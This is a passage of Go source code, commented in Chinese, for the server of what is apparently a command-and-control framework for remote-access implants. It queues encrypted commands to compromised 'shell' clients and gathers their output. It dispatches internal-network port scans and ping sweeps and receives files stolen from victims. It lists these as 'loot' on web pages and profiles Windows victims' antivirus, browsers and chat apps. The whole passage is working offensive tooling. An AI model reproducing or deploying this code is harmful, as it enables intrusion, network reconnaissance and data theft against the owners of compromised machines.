        return ""
    }
    queue.mu.Lock()
    defer queue.mu.Unlock()
    for i := range queue.results {
        res := &queue.results[i]
        if res.Taskid == taskid {
            result := res.Result
            queue.results = append(queue.results[:i], queue.results[i+1:]...)
            return result
        }
    }
    return ""
}

// 写入结果
func Results(uid, results, Taskid string,code_map map[byte]int) {
    keyMu.RLock()
    key, exists := key_map[uid]
    keyMu.RUnlock()
    if !exists {
        return
    }
    decry_results := Get_decry_s(&results, &key,code_map)
    go SaveMsg(uid, decry_results, Taskid)

    // 写入结果列表
    resultMu.RLock()
    queue, ok := msgResultQueues[uid]
    resultMu.RUnlock()

    if !ok {
        // 如果队列不存在，加写锁创建一个
        resultMu.Lock()
        // 双重检查，防止并发创建
        if queue, ok = msgResultQueues[uid]; !ok {
            queue = &resultQueue{results: make([]Msg_result, 0)}
            msgResultQueues[uid] = queue
        }
        resultMu.Unlock()
    }

    // 写入具体 UID 的结果池，只锁 queue.mu
    queue.mu.Lock()
    queue.results = append(queue.results, Msg_result{
        Uid:    uid,
        Result: decry_results,
        Taskid: Taskid,
    })
    queue.mu.Unlock()

    // 日志记录
    var shellname string
    clientDataMu.RLock()
    defer clientDataMu.RUnlock()
    for i := range client_data.Clients {
        client := &client_data.Clients[i]
        if uid == client.Uid {
            shellname = client.Host
            break
        }
    }
    log_str := fmt.Sprintf(log_word["result"], shellname, uid, len(results))
    logger.WriteLog(log_str)
}

// 获取指令
func GetMsg(uid, base_rounds string) string {
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04:05")
    go func(uid string) {
        clientDataMu.Lock()
        for i := range client_data.Clients {
            client := &client_data.Clients[i]
            if client.Uid == uid {
                client.checkTime = formattedTime
                break
            }
        }
        clientDataMu.Unlock()
        windows_clientMu.Lock()
        for i := range windows_client_data.Clients {
            client := &windows_client_data.Clients[i]
            if client.Uid == uid {
                client.CheckTime = formattedTime
                break
            }
        }
        windows_clientMu.Unlock()
    }(uid)
    keyMu.RLock()
    _, hasKey := key_map[uid]
    keyMu.RUnlock()
    if !hasKey {
        return customBase64Encode([]byte(uid), base_rounds)
    }
    // 先取队列指针（只读锁）
    queuesMu.RLock()
    queue := msgQueues[uid]
    queuesMu.RUnlock()
    if queue == nil {
        return ""
    }
    // 只锁队列内容
    queue.mu.Lock()
    defer queue.mu.Unlock()
    if len(queue.messages) == 0 {
        return ""
    }
    msg := queue.messages[0]
    queue.messages = queue.messages[1:]
    return msg.Encry_Msg
}

// 写入指令（推送到对应 uid 的消息队列）
func Getcmd(uid, cmd, Taskid string) string {
    var base_rounds string
    if uid != "" {
        uidMutex.Lock()
        val, exists := uid_base[uid]
        uidMutex.Unlock()
        if !exists {
            return "missing parameter"
        }
        base_rounds = val
    }
    keyMu.RLock()
    key, exists := key_map[uid]
    keyMu.RUnlock()
    if !exists {
        return "client not registered"
    }
    var finalCmd string
    var logMsg string

    if cmd != "" && !strings.HasPrefix(cmd, "SWITCH_VERSION^") &&
        !strings.HasPrefix(cmd, "GET_PORTS^") && !strings.HasPrefix(cmd, "GET_U_FRIENDS^") &&
        !strings.HasPrefix(cmd, "LOAD_U_FILE^") && !strings.HasPrefix(cmd, "GET_U_FILE^") &&
        !strings.HasPrefix(cmd, "GET_JITTER^") && !strings.HasPrefix(cmd, "GET_DELAY^") {
        // 普通指令
        finalCmd = cmd + "^" + Taskid
    } else if strings.HasPrefix(cmd, "SWITCH_VERSION^") {
        // SWITCH_VERSION
        cmd_split := strings.Split(cmd, "^")
        if len(cmd_split) != 2 {
            return "missing parameter"
        }
        version := cmd_split[1]

        // 更新 client version
        clientDataMu.Lock()
        for i := range client_data.Clients {
            client := &client_data.Clients[i]
            if uid == client.Uid {
                client.version = version
                break
            }
        }
        clientDataMu.Unlock()

        finalCmd = cmd + "^" + Taskid

    } else if strings.HasPrefix(cmd, "GET_JITTER^") || strings.HasPrefix(cmd, "GET_DELAY^") {
        parts := strings.Split(cmd, "^")
        if len(parts) != 2 {
            return "missing parameter"
        }
        v, err := strconv.Atoi(parts[1])
        if err != nil {
            return "parameter is not int"
        }
        if v <= 0 {
            return "parameter must be > 0"
        }
        finalCmd = cmd + "^" + Taskid
    }else if strings.HasPrefix(cmd, "GET_PORTS^") || strings.HasPrefix(cmd, "GET_U_FRIENDS^") {

        // GET_PORTS / GET_U_FRIENDS
        parts := strings.Split(cmd, "^")
        if len(parts) != 5 {
            return "missing parameter"
        }

        sleep_time, err := strconv.Atoi(parts[3])
        if err != nil {
            return "delay is not int"
        }
        if sleep_time < 1 {
            sleep_time = 1
        }

        if parts[4] == "" {
            parts[4] = "whatever"
        }

        if strings.HasPrefix(cmd, "GET_U_FRIENDS^") {
            ip_split := strings.Split(parts[1], ".")
            if len(ip_split) != 4 || !Check_comment(ip_split[3], "ping") {
                return "Format error"
            }
        }

        if !Check_comment(parts[2], "port") {
            return "Format error"
        }

        finalCmd = fmt.Sprintf("%s^%s^%s^%d^%s^%s",
            parts[0], parts[1], parts[2], sleep_time, parts[4], Taskid)

        logMsg = fmt.Sprintf(log_word["scan_msg"], uid, parts[1])

    } else if strings.HasPrefix(cmd, "GET_U_FILE^") || strings.HasPrefix(cmd, "LOAD_U_FILE^") {

        // GET_U_FILE / LOAD_U_FILE
        var newCmd string
        parts := strings.Split(cmd, "^")

        if strings.HasPrefix(cmd, "GET_U_FILE^") {
            if len(parts) != 3 {
                return "missing parameter"
            }
            splitSizeStr := parts[2]
            if dot := strings.Index(splitSizeStr, "."); dot != -1 {
                splitSizeStr = splitSizeStr[:dot]
            }
            splitSize, err := strconv.Atoi(splitSizeStr)
            if err != nil || splitSize <= 0 {
                parts[2] = "1048576"
            } else {
                parts[2] = strconv.Itoa(splitSize)
            }
            newCmd = strings.Join(parts, "^")
        }

        if strings.HasPrefix(cmd, "LOAD_U_FILE^") {
            if len(parts) != 2 {
                return "missing parameter"
            }
            str_parts := strings.Split(parts[1], "*")
            splitSizeStr := strings.TrimSpace(str_parts[len(str_parts)-1])
            if dot := strings.Index(splitSizeStr, "."); dot != -1 {
                splitSizeStr = splitSizeStr[:dot]
            }
            splitSize, err := strconv.Atoi(splitSizeStr)
            if err != nil || splitSize <= 0 {
                str_parts[len(str_parts)-1] = "1048576"
            } else {
                str_parts[len(str_parts)-1] = strconv.Itoa(splitSize)
            }
            newCmd = "LOAD_U_FILE^" + strings.Join(str_parts, "*")
        }

        finalCmd = newCmd + "^" + Taskid

    } else {
        return "missing parameter"
    }

    // 加密
    encryptedCmd := Get_encry_s(&finalCmd, &key, &base_rounds)

    // 写入消息队列（使用新队列结构）
    newMsg := Msg_get{
        Ori_Msg:   cmd,
        Encry_Msg: encryptedCmd,
        Taskid:    Taskid,
    }
    queue := getOrCreateQueue(uid)
    queue.mu.Lock()
    queue.messages = append(queue.messages, newMsg)
    queue.mu.Unlock()

    // 写日志（保持与旧函数一致）
    if logMsg != "" {
        logger.WriteLog(logMsg)
    } else {
        if !strings.HasPrefix(cmd, "CHANG_FILE_NAME^") &&
            !strings.HasPrefix(cmd, "CHANG_FILE_TIME^") &&
            !strings.HasPrefix(cmd, "GET_DELAY^") &&
            !strings.HasPrefix(cmd, "LOOK_UP_FILE^") &&
            !strings.HasPrefix(cmd, "LOAD_U_FILE^") &&
            !strings.HasPrefix(cmd, "SWITCH_VERSION^") &&
            !strings.HasPrefix(cmd, "GET_U_FILE^") &&
            !strings.HasPrefix(cmd, "GET_JITTER^") {

            go func(uid string) {
                clientDataMu.RLock()
                defer clientDataMu.RUnlock()
                for i := range client_data.Clients {
                    client := &client_data.Clients[i]
                    if uid == client.Uid {
                        log_str := fmt.Sprintf(log_word["msg"], client.Host, uid, cmd)
                        logger.WriteLog(log_str)
                        return
                    }
                }
            }(uid)
        }
    }

    return ""
}

//获取内网资产
func Net_getresults(uid string) (string, error) {
    if uid == "" {
        return "", fmt.Errorf("uid is empty")
    }
    netMu.Lock()
    shell_results, exists := shell_net_post[uid]
    if exists {
        delete(shell_net_post, uid)
        netMu.Unlock()
        // 存入内网资产端口结构体...
        in_port(uid, shell_results)
        return shell_results, nil
    }
    netMu.Unlock()
    return "", fmt.Errorf("data not found for uid: %s", uid)
}

//写入内网资产
func Net_results(uid,results string,code_rounds map[byte]int) {
    keyMu.RLock()
    key, exists := key_map[uid]
    keyMu.RUnlock()
    if exists {
        encryptedData := Get_decry_s(&results, &key,code_rounds)
        netMu.Lock()
        shell_net_post[uid] = encryptedData
        netMu.Unlock()
        go func(encryptedData, key, uid string) {
            var shellname string
            clientDataMu.RLock()
            for i := range client_data.Clients {
                client := &client_data.Clients[i]
                if uid == client.Uid {
                    shellname = client.Host
                    break
                }
            }
			clientDataMu.RUnlock()
            logStr := fmt.Sprintf(log_word["scan_result"], shellname, uid, len(encryptedData))
            logger.WriteLog(logStr)
        }(encryptedData, key, uid)
    }
}
func Check_comment(check_parts, option string) bool {
    if strings.Contains(check_parts, "-") {
        split_int := strings.Split(check_parts, "-")
        s, se := strconv.Atoi(split_int[0])
        e, ee := strconv.Atoi(split_int[1])
        if se != nil || ee != nil || s < 0 || e < 0 {
            return false
        }
        if s > e {
            return false
        }
        if option == "port" && e > 65535 {
            return false
        } else if option == "ping" && e > 255 {
            return false
        }
    } else if strings.Contains(check_parts, ",") {
        uniquePorts := []string{}
        portMap := make(map[int]bool)
        split_int := strings.Split(check_parts, ",")
        for _, v := range split_int {
            port, err := strconv.Atoi(strings.TrimSpace(v))
            if err != nil || port < 0 {
                return false
            }
            if option == "port" && port > 65535 {
                return false
            } else if option == "ping" && port > 255 {
                return false
            }
            if !portMap[port] {
                portMap[port] = true
                uniquePorts = append(uniquePorts, strconv.Itoa(port))
            }
        }
    } else {
        _, err := strconv.Atoi(check_parts)
        return err == nil
    }
    return true
}

//写入内网资产端口
func in_port(uid, data string) {
    ipPorts := make(map[string][]string)
    re := regexp.MustCompile(`(\d+\.\d+\.\d+\.\d+):\[(\d+)\]`)
    matches := re.FindAllStringSubmatch(data, -1)
    for _, match := range matches {
        if len(match) >= 3 {
            ip := match[1]  // IP 地址
            port := match[2] // 端口
            ipPorts[ip] = append(ipPorts[ip], port)
        }
    }
    for ip, ports := range ipPorts {
        put_innet(uid, ip, ports)
    }
}

//删除内网
func Del_shell_innet(target,shellname,uid string)string{
    dataInnetmu.Lock()
    defer dataInnetmu.Unlock()
	for i := range data_innet.Innets {
        innet := &data_innet.Innets[i]
        if target == innet.Target && uid == innet.Uid {
            data_innet.Innets = append(data_innet.Innets[:i], data_innet.Innets[i+1:]...)
            return "Successfully deleted target"
        }
    }
    return "cannot deleted target"
}
func Check_clients()([]map[string]string, error) {
    serverDataMu.RLock()
    defer serverDataMu.RUnlock()
    check_map := make([]map[string]string, 0, len(server_data.Servers))
    for i := range server_data.Servers {
        server := &server_data.Servers[i]
        check_info := map[string]string{
            "port":   server.Port,
            "client": strconv.Itoa(server.Clients),
        }
        check_map = append(check_map, check_info)
    }
    if len(check_map) == 0 {
        return nil, fmt.Errorf("no clients found for the port:")
    }
    return check_map, nil
}
func Check_Time_Pro()([]map[string]string, error){
    windows_clientMu.RLock()
    defer windows_clientMu.RUnlock()
    check_map := make([]map[string]string, 0, len(windows_client_data.Clients))
    for i := range windows_client_data.Clients {
        client := &windows_client_data.Clients[i]
        check_info := map[string]string{
            "checkTime": client.CheckTime,
            "uid":       client.Uid,
        }
        check_map = append(check_map, check_info)
    }
    if len(check_map) == 0 {
        return nil, fmt.Errorf("no clients found for the")
    }
    return check_map, nil
}
func Check_Time() ([]map[string]string, error) {
    clientDataMu.RLock()
    defer clientDataMu.RUnlock()
    check_map := make([]map[string]string, 0, len(client_data.Clients))
    for i := range client_data.Clients {
        client := &client_data.Clients[i]
        check_info := map[string]string{
            "checkTime": client.checkTime,
            "uid":       client.Uid,
        }
        check_map = append(check_map, check_info)
    }
    if len(check_map) == 0 {
        return nil, fmt.Errorf("no clients found")
    }
    return check_map, nil
}
func ServerIndex(Count string) ([]Server, error) {
    client_count, err := strconv.Atoi(Count)
    serverDataMu.RLock()
    defer serverDataMu.RUnlock()
    if err != nil {
        return nil, fmt.Errorf("invalid count: %v", err)
    }
    matchedCount := len(server_data.Servers)
    if client_count != matchedCount {
        matchedServers := make([]Server,0,len(server_data.Servers))
        for i := range server_data.Servers {
            server := &server_data.Servers[i]
            matchedServers = append(matchedServers, *server)
        }
        if len(matchedServers) == 0 {
            return nil, fmt.Errorf("no servers found")
        }
        return matchedServers, nil
    }else {
        return nil, fmt.Errorf("no needed")
    }
}

type EnrichedClient struct {
    Username        string              `json:"username"`
    Host            string              `json:"host"`
    OS              string              `json:"os"`
    Delay           int                 `json:"delay"`
    OnlineTime      string              `json:"online_time"`
    ExternalIP      string              `json:"external_ip"`
    LocalIP         string              `json:"local_ip"`
    CurrentDir      string              `json:"current_dir"`
    Version         string              `json:"version"`
    Remarks         string              `json:"remarks"`
    CheckTime       string              `json:"check_time"`
    Uid             string              `json:"uid"`
    Server          string              `json:"server"`
    PluginParameter map[string]map[string][]string    `json:"plugin_parameter"`
    Executable      string              `json:"executable"`
    Jitter          int                 `json:"jitter"`
}

func UserIndex(Count string) ([]EnrichedClient, error) {
    client_count, err := strconv.Atoi(Count)
    if err != nil {
        return nil, fmt.Errorf("invalid count: %v", err)
    }

    clientDataMu.RLock()
    defer clientDataMu.RUnlock()
    // 统计匹配数量
    matchedCount := 0
    for range client_data.Clients {
        matchedCount++
    }
    if client_count == matchedCount {
        return nil, fmt.Errorf("no needed")
    }
    matchedClients := make([]EnrichedClient, 0, len(client_data.Clients))
    serverPluginMu.RLock()
    defer serverPluginMu.RUnlock()
    for i := range client_data.Clients {
        client := &client_data.Clients[i]
        pluginParamMap := make(map[string]map[string][]string)
        for j := range server_plugin.Plugins {
            plugin := &server_plugin.Plugins[j]
            if plugin.Remark == client.Server {
                os := plugin.os
                code := plugin.CodeWord
                desc := plugin.ParameterDesc
                if pluginParamMap[os] == nil {
                    pluginParamMap[os] = make(map[string][]string)
                }
                pluginParamMap[os][code] = desc
            }
        }
        enriched := EnrichedClient{
            Username:        client.Username,
            Host:            client.Host,
            OS:              client.OS,
            Delay:           client.Delay,
            OnlineTime:      client.OnlineTime,
            ExternalIP:      client.ExternalIP,
            LocalIP:         client.LocalIP,
            CurrentDir:      client.CurrentDir,
            Version:         client.version,
            Remarks:         client.Remarks,
            CheckTime:       client.checkTime,
            Uid:             client.Uid,
            Server:          client.Server,
            PluginParameter: pluginParamMap,
            Executable:      client.Executable,
            Jitter:          client.Jitter,
        }
        matchedClients = append(matchedClients, enriched)
    }
    return matchedClients, nil
}
// Windows 专用的客户端列表获取函数
type EnrichedWindowsClient struct {
    Username        string              `json:"username"`
    Host            string              `json:"host"`
    OS              string              `json:"os"`
    Delay           int                 `json:"delay"`
    OnlineTime      string              `json:"online_time"`
    ExternalIP      string              `json:"external_ip"`
    LocalIP         string              `json:"local_ip"`
    CurrentDir      string              `json:"current_dir"`
    Version         string              `json:"version"`
    Remarks         string              `json:"remarks"`
    CheckTime       string              `json:"check_time"`
    Uid             string              `json:"uid"`
    Server          string              `json:"server"`
    PluginParameter map[string]map[string][]string    `json:"plugin_parameter"`
    Executable      string              `json:"executable"`
    Jitter          int                 `json:"jitter"`
    // Windows 专属字段
    MacAddresses string `json:"mac_addresses"`  // MAC地址
    CPUInfo      string `json:"cpu_info"`       // CPU信息
    Antivirus    string `json:"antivirus"`      // 杀毒软件
    Browsers     string `json:"browsers"`       // 浏览器信息
    ChatApps     string `json:"chat_apps"`      // 聊天应用
    MemoryInfo   string `json:"memory_info"`    // 内存使用情况
    SystemType   string `json:"system_type"`    // 系统类型
    Architecture string `json:"architecture"`   // 架构信息
}

func windows_pro_UserIndex(Count string) ([]EnrichedWindowsClient, error) {
    client_count, err := strconv.Atoi(Count)
    if err != nil {
        return nil, fmt.Errorf("invalid count: %v", err)
    }
    windows_clientMu.RLock()
    defer windows_clientMu.RUnlock()
    // 统计匹配数量
    matchedCount := 0
    for range windows_client_data.Clients {
        matchedCount++
    }
    if client_count == matchedCount {
        return nil, fmt.Errorf("no needed")
    }
    matchedClients := make([]EnrichedWindowsClient, 0, len(windows_client_data.Clients))
    serverPluginMu.RLock()
    defer serverPluginMu.RUnlock()
    for i := range windows_client_data.Clients {
        client := &windows_client_data.Clients[i]
        pluginParamMap := make(map[string]map[string][]string)
        for j := range server_plugin.Plugins {
            plugin := &server_plugin.Plugins[j]
            if plugin.Remark == client.Server {
                os := plugin.os
                if pluginParamMap[os] == nil {
                    pluginParamMap[os] = make(map[string][]string)
                }
                pluginParamMap[os][plugin.CodeWord] = plugin.ParameterDesc
            }
        }
        enriched := EnrichedWindowsClient{
            Username:        client.Username,
            Host:            client.Host,
            OS:              client.OS,
            Delay:           client.Delay,
            OnlineTime:      client.OnlineTime,
            ExternalIP:      client.ExternalIP,
            LocalIP:         client.LocalIP,
            CurrentDir:      client.CurrentDir,
            Version:         client.Version,
            Remarks:         client.Remarks,
            CheckTime:       client.CheckTime,
            Uid:             client.Uid,
            Server:          client.Server,
            PluginParameter: pluginParamMap,
            Executable:      client.Executable,
            Jitter:          client.Jitter,
            // Windows 专属字段（指针访问）
            MacAddresses:    client.MacAddresses,
            CPUInfo:         client.CPUInfo,
            Antivirus:       client.Antivirus,
            Browsers:        client.Browsers,
            ChatApps:        client.ChatApps,
            MemoryInfo:      client.MemoryInfo,
            SystemType:      client.SystemType,
            Architecture:    client.Architecture,
        }
        matchedClients = append(matchedClients, enriched)
    }
    
    return matchedClients, nil
}
//下载文件
func DownloadFile(uid, keyDecry string,code_map map[byte]int) ([]byte, error) {
    keyMu.RLock()
    key, exists := key_map[uid]
    keyMu.RUnlock()
    if !exists {
        return nil, errors.New("key not found")
    }
    DoByteMu.Lock()
    defer DoByteMu.Unlock()
    filekey := Get_decry_s(&keyDecry, &key,code_map)
    existingData, exists := DownloadFile_byte_parts[filekey]
    if !exists {
        return nil, errors.New("file not found")
    }
    parts := strings.Split(filekey, "*")
    if len(parts) != 3 {
        delete(DownloadFile_byte_parts, filekey)
        return nil, errors.New("splitSize missing")
    }
    splitSize, err := strconv.Atoi(parts[2])
    if err != nil || splitSize <= 0 {
        delete(DownloadFile_byte_parts, filekey)
        return nil, errors.New("invalid splitSize")
    }
    currentPartsCount, exists := parts_count[filekey]
    if !exists {
        currentPartsCount = 0
    }
    totalParts := int(math.Ceil(float64(len(existingData)) / float64(splitSize)))
    if currentPartsCount >= totalParts {
        log_str := fmt.Sprintf(log_word["download"], uid, parts[1])
        logger.WriteLog(log_str)
        delete(DownloadFile_byte_parts, filekey)
        delete(parts_count, filekey)
        return nil, nil
    }
    start := currentPartsCount * splitSize
    end := start + splitSize
    if end > len(existingData) {
        end = len(existingData)
    }
    partData := existingData[start:end]
    parts_count[filekey] = currentPartsCount + 1
    log_str := fmt.Sprintf(log_word["download_part"], uid, parts[1], len(partData), currentPartsCount)
    logger.WriteLog(log_str)
    if parts_count[filekey] >= totalParts {
        delete(DownloadFile_byte_parts, filekey)
        delete(parts_count, filekey)
    }
    return partData, nil
}
// 上传文件处理
func UploadFileHandler(uid,data,filename string, 
    fileData []byte,code_map map[byte]int){
    // 检查 UID 是否有效
    keyMu.RLock()
    key, exists := key_map[uid]
    keyMu.RUnlock()
    if !exists {
        return
    }
    key_part := []byte(key)
    decry_data := Get_decry_s(&data,&key,code_map)
    tempFilename := Get_decry_s(&filename,&key,code_map)
    realFilename := getFilenameFromPath(tempFilename)
    data_list := strings.Split(decry_data,"^")
    username := data_list[0]
    splitSize := data_list[1]
    fileSize := data_list[2]
    start := data_list[3]
    end := data_list[4]
    fileLog := fmt.Sprintf(log_word["request_file"])
    logger.WriteLog(fileLog)
    splitPos,_ := strconv.Atoi(splitSize)
    filePos, _ := strconv.Atoi(fileSize)
    startPos, _ := strconv.Atoi(start)
    endPos, _ := strconv.Atoi(end)
    fileLog1 := fmt.Sprintf(log_word["request_file_part"], realFilename, len(fileData)/(1024*1024))
    logger.WriteLog(fileLog1)
    // 拼接文件名
    receivedFilePath := "./uploads/" + uid + "/" + realFilename
    dirPath := filepath.Dir(receivedFilePath)
    // 检查目录是否存在
    if _, err := os.Stat(dirPath); os.IsNotExist(err) {
        // 如果目录不存在，则创建
        err := os.MkdirAll(dirPath, 0755)
        if err != nil {
            return
        }
    }
    // 将文件块保存到全局变量
    file_key := uid + "=" + realFilename
    upByteMu.Lock()
    if existingData, exists := UploadFile_byte_parts[file_key]; exists {
        // 如果存在已经保存的部分，将当前的分段追加到之前的字节流中
        UploadFile_byte_parts[file_key] = append(existingData, fileData...)
    } else {
        // 如果没有保存该文件的分段，则保存当前分段
        UploadFile_byte_parts[file_key] = fileData
    }
    // 判断是否是最后一段，如果是，合并所有分段并解密
    if endPos == filePos {
        // 解密文件
        err := decryptFile(file_key,receivedFilePath,uid,key_part)
        if err != nil {
            return
        }
        // 解密后清空全局变量中的文件数据
        delete(UploadFile_byte_parts, file_key)
    }
	upByteMu.Unlock()
    fileLog2 := fmt.Sprintf(log_word["request_file_part_"],
    username, uid, realFilename, splitPos/(1024*1024), startPos/(1024*1024), endPos/(1024*1024))
    logger.WriteLog(fileLog2)
}
// 解密文件
func decryptFile(receivedFile, receivedFilePath, uid string, key []byte) error {
    outputFile, err := os.Create(receivedFilePath)
    if err != nil {
        return err
    }
    defer outputFile.Close()
    return Get_decry_f(UploadFile_byte_parts[receivedFile], outputFile, key)
}
func getFilenameFromPath(path string) string {
    // 查找最后一个斜杠的位置，可以是 / 或 \
    lastSlash := strings.LastIndexAny(path, "/\\")
    if lastSlash == -1 {
        // 如果没有斜杠，直接返回原路径作为文件名
        return path
    }
    // 返回斜杠后面的部分作为文件名
    return path[lastSlash+1:]
}

type LogEntry struct {
    Time    string `json:"time"`
    Message string `json:"message"`
}
// 读取日志，返回结构体切片
func Log_read(maxLines int) ([]LogEntry, error) {
    file, err := os.Open("server.log")
    if err != nil {
        return nil, fmt.Errorf("open log file failed: %v", err)
    }
    defer file.Close()
    entries := make([]LogEntry, 0, maxLines)
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        var entry LogEntry
        if err := json.Unmarshal(scanner.Bytes(), &entry); err != nil {
            continue
        }
        if len(entries) < maxLines {
            entries = append(entries, entry)
        } else {
            // 滑动窗口：整体左移 1 位
            copy(entries, entries[1:])
            entries[maxLines-1] = entry
        }
    }
    if err := scanner.Err(); err != nil {
        return nil, fmt.Errorf("read log file error: %v", err)
    }
    return entries, nil
}
// 日志记录器
type MyLog struct{}
func (w *MyLog) WriteLog(logStr string) {
    logPath := "server.log"
    entry := LogEntry{
        Time:    time.Now().Format("2006-01-02 15:04:05"),
        Message: logStr,
    }
    data, err := json.Marshal(entry)
    if err != nil {
        fmt.Println("marshal log error:", err)
        return
    }
    file, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
    if err != nil {
        fmt.Println("can not log:", err)
        return
    }
    defer file.Close()
    _, err = file.Write(append(data, '\n'))
    if err != nil {
        fmt.Println("write log error:", err)
    }
}

// Get_loots_pro 获取所有客户端（包括 Windows Pro）的战利品并渲染 HTML
func Get_loots_pro(username, web_route string, w http.ResponseWriter, r *http.Request) {
    type clientMeta struct {
        Uid  string
        Host string
    }
    clientMap := make(map[string]string)
    clientDataMu.RLock()
    for i := range client_data.Clients {
        c := &client_data.Clients[i]
        clientMap[c.Uid] = c.Host
    }
    clientDataMu.RUnlock()
    windows_clientMu.RLock()
    for i := range windows_client_data.Clients {
        c := &windows_client_data.Clients[i]
        clientMap[c.Uid] = c.Host
    }
    windows_clientMu.RUnlock()
    if len(clientMap) == 0 {
        http.Error(w, "no client online", http.StatusNotFound)
        return
    }
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    fmt.Fprintf(w, `<html><body><h2>User %s loot</h2><ul>`, username)
    // 3. 遍历 UID 目录（此时已在锁外）
    for uid, host := range clientMap {
        dirPath := filepath.Join("uploads", uid)
        files, err := os.ReadDir(dirPath)
        if err != nil {
            continue // 目录不存在或读取失败，跳过该用户
        }
        fmt.Fprintf(w, `
        <div class="uid-section">
            <strong>UID: %s</strong> <span class="host-tag">%s</span>
            <ul class="file-list">`, uid, host)
        hasFile := false
        for _, file := range files {
            if !file.IsDir() {
                hasFile = true
                fileName := file.Name()
                fullPath := filepath.Join(dirPath, fileName)
                // 获取文件详情
                fileInfo, _ := os.Stat(fullPath)
                sizeKB := fileInfo.Size() / 1024
                modTime := fileInfo.ModTime().Format("2006-01-02 15:04:05")
                encodedFile := url.QueryEscape(fileName)
                filePath := fmt.Sprintf("/%s?op=getloot&uid=%s&file=%s", web_route, uid, encodedFile)
                fmt.Fprintf(w, `
                <li class="file-item">
                    📄 %s 
                    <span class="meta-info">[%d KB] | [%s]</span>
                    <a href="%s" class="download-btn" title="Download">⬇️</a>
                </li>`, fileName, sizeKB, modTime, filePath)
            }
        }

        if !hasFile {
            fmt.Fprint(w, `<li class="file-item" style="color:gray;"><i>No loot found in this directory.</i></li>`)
        }
        fmt.Fprint(w, `</ul></div>`)
    }

    fmt.Fprint(w, `</body></html>`)
}
// 获取用户所有战利品
func Get_loots(username, web_route string, w http.ResponseWriter, r *http.Request) {
    clientDataMu.RLock()
    shell_list := make([]string, 0, len(client_data.Clients))
    for i := range client_data.Clients {
        shell_list = append(shell_list, client_data.Clients[i].Uid)
    }
    clientDataMu.RUnlock()
    if len(shell_list) == 0 {
        http.Error(w, "no client", http.StatusNotFound)
        return
    }
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    fmt.Fprintf(w, `<html><body><h2>User %s loot</h2><ul>`, username)
    for _, uid := range shell_list {
        dirPath := filepath.Join("uploads", uid)
        files, err := os.ReadDir(dirPath)
        if err != nil {
            continue 
        }
        fmt.Fprintf(w, `<li><strong>UID: %s</strong><ul>`, uid)
        hasFile := false
        for _, file := range files {
            if !file.IsDir() {
                hasFile = true
                fileName := file.Name()
                encodedFile := url.QueryEscape(fileName)
                filePath := fmt.Sprintf("/%s?op=getloot&uid=%s&file=%s", web_route, uid, encodedFile)
                fmt.Fprintf(w, `<li>📄 %s <a href="%s" style="text-decoration:none;">⬇️</a></li>`, fileName, filePath)
            }
        }
        if !hasFile {
            fmt.Fprint(w, `<li><i style="color:gray;">No files</i></li>`)
        }
        fmt.Fprint(w, `</ul></li>`)
    }
    fmt.Fprint(w, `</ul></body></html>`)
}

// 前端上传文件
func UserUploadFile(uid, filename, splitSize string, file io.Reader) {
    var logStr string
    keyMu.RLock()
    key, exists := key_map[uid]
    keyMu.RUnlock()
    if !exists {
        logStr = fmt.Sprintf(log_word["web_upload"], uid)
        logger.WriteLog(logStr)
        return
    }
    // 默认切片大小 1MB
    if dotIndex := strings.Index(splitSize, "."); dotIndex != -1 {
        splitSize = splitSize[:dotIndex]
    }
    splitPos, err := strconv.Atoi(splitSize)
    if err != nil || splitPos <= 0 {
        splitPos = 1048576
    }
    // 创建临时文件
    tmpFile, err := os.CreateTemp("", "upload-*")
    if err != nil {
        logStr = fmt.Sprintf(log_word["tmp_file"], uid, err)
        logger.WriteLog(logStr)
        return
    }
    defer os.Remove(tmpFile.Name())
    defer tmpFile.Close()
    // 写入临时文件
    written, err := io.Copy(tmpFile, file)
    if err != nil {
        logStr = fmt.Sprintf(log_word["write_tmp"], uid, err)
        logger.WriteLog(logStr)
        return
    }
    // 回读内容做加密（如果加密函数不支持流）
    tmpFile.Seek(0, io.SeekStart)
    fileContent, err := io.ReadAll(tmpFile)
    if err != nil {
        logStr = fmt.Sprintf(log_word["read_tmp"], uid, err)
        logger.WriteLog(logStr)
        return
    }
    encryptedFileContent, err := Get_encry_f(&fileContent, &key)
    if err != nil {
        logStr = fmt.Sprintf(log_word["encry_tmp_fail"], uid, filename)
        logger.WriteLog(logStr)
        return
    }
    file_key := uid + "*" + filename + "*" + strconv.Itoa(splitPos)
    DoByteMu.Lock()
    DownloadFile_byte_parts[file_key] = encryptedFileContent
    DoByteMu.Unlock()
    logStr = fmt.Sprintf(log_word["encry_tmp"], uid, written, filename)
    logger.WriteLog(logStr)
}

func Get_Clients(username string) (map[string]string, error) {
    shell_list := make(map[string]string)
    clientDataMu.RLock()
    defer clientDataMu.RUnlock()
    for i := range client_data.Clients {
        client := &client_data.Clients[i]
        if username == client.Username {
            shell_list[client.Uid] = client.Host
        }
    }
    if len(shell_list) == 0 {
        return nil, fmt.Errorf("no clients found for username: %s", username)
    }
    return shell_list, nil
}
func ClearUnmarkedGlobalVars() {
    // 1) 清理 msgQueues（替代 msg_get_list）
    queuesMu.Lock()
    msgQueues = make(map[string]*uidMsgQueue)
    queuesMu.Unlock()

    // 2) 清理 key1_map / key2_map / key3_map
    key1Mu.Lock()
    key1_map = make(map[string][]byte)
    key1Mu.Unlock()

    key2Mu.Lock()
    key2_map = make(map[string][]byte)
    key2Mu.Unlock()

    key3Mu.Lock()
    key3_map = make(map[string][]int)
    key3Mu.Unlock()

    // 3) 清理 msgFileQueue
    fileMu.Lock()
    msgFileQueue = make(map[string]*fileQueue)
    fileMu.Unlock()

    // 4) 清理 msg_result_list
    resultMu.Lock()
    msgResultQueues = make(map[string]*resultQueue)
    resultMu.Unlock()

    // 5) 清理 msg_map_list
    mapMu.Lock()
    msg_map_list = make([]Msg_result, 0)
    mapMu.Unlock()

    // 6) 清理 msg_file_cache
    fcache.Lock()
    msg_file_cache = make([]Msg_file, 0)
    fcache.Unlock()

    // 7) 清理 shell_net_post
    netMu.Lock()
    shell_net_post = make(map[string]string)
    netMu.Unlock()

    upByteMu.Lock()
    UploadFile_byte_parts = make(map[string][]byte)
    upByteMu.Unlock()

    DoByteMu.Lock()
    DownloadFile_byte_parts = make(map[string][]byte)
    parts_count = make(map[string]int)
    DoByteMu.Unlock()

